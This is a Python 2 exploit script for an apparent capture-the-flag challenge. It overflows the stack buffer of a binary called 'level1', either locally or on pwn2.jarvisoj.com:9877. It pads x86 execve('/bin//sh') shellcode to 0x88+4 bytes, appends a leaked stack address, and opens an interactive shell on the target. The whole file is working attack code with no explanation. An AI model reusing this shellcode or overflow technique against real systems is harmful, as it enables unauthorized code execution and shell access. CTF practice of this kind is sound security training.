#!/usr/bin/env python
# encoding:utf-8

import binascii
import sys
import zio

def getCover(content, length):
    return content + "@" * (length - len(content))

def getShellcode():
    shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x0f\x34"
    shellcode = "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34";
    return shellcode

def getPayloadWithoutAddress():
    tempPayload = getCover(getShellcode(), 0x88 + 4)
    return tempPayload

def showHelp():
    print "Usage : "
    print "        python exploit.py [local|remote]"

def main():
    if len(sys.argv) != 2:
        showHelp()
        exit(1)
    if sys.argv[1] == "local":
        Io = zio.zio("./level1")
    elif sys.argv[1] == "remote":
        Io = zio.zio(("pwn2.jarvisoj.com", 9877))
    else:
        showHelp()
        exit(2)
    temp = Io.readline()[len("What's this:"):-2]
    print "Address : [%s]" % (temp)
    address = zio.l32(int(temp, 16))
    print binascii.b2a_hex(address)
    payload = getPayloadWithoutAddress() + address
    print binascii.b2a_hex(payload)
    Io.write(payload)
    Io.interact()

if __name__ == "__main__":
    main()
